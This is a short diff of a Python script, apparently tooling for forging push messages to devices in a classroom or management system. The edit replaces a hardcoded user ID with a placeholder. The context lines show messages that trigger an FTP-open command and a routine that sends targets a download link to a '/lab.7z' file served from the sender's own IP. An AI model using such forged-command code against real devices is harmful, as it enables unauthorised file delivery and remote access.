@@ -368,7 +368,7 @@ def build_socket_message(msg_type=OPEN_FTP_CODE):
         "forward": 0,
         "senderId": 0,
         "type": msg_type,                    # ★ 真字段名是 type(不是 messageType!)
-        "userIds": os.environ.get("USER_IDS", "2112229"),
+        "userIds": os.environ.get("USER_IDS", "<USER_ID>"),
     }
 
 
@@ -385,7 +385,7 @@ def push_battery(conn):
     策略: 全部下发(端侧分发器会自行路由识别得了的那条), 用日志看哪条命中。
     """
     cid = os.environ.get("CLASS_ID", "UXHOVJJF")
-    uid = os.environ.get("USER_IDS", "2112229")
+    uid = os.environ.get("USER_IDS", "<USER_ID>")
     base = "http://%s:%d" % (OWN_IP, HTTP_PORT)
     files = {"url": base + "/lab.7z", "fileUrl": base + "/lab.7z",
              "downloadUrl": base + "/lab.7z", "resourceUrl": base + "/lab.7z",
